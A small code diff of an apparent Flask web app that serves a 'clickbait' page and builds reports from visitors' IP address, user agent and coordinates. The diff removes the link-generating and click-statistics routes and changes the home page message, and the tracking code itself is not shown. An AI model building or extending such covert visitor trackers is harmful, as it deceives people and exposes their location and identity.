@@ -169,11 +169,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 @app.route('/')
 def home():
-    return "Используйте /generate для создания кликбейт-ссылки."
-
-@app.route('/generate')
-def generate_link():
-    return f"Вот ваша ссылка: {request.host_url}sosish"
+    return "Что?"
 
 @app.route('/sosish')
 def clickbait_page():
@@ -279,10 +275,6 @@ def clickbait_page():
     except Exception as e:
         logging.error(f"Error in /sosish route: {e}")
         return "An internal error occurred", 500
-
-@app.route('/stats')
-def stats():
-    return jsonify({"click_count": click_count})
 
 if __name__ == '__main__':
     host = "0.0.0.0"
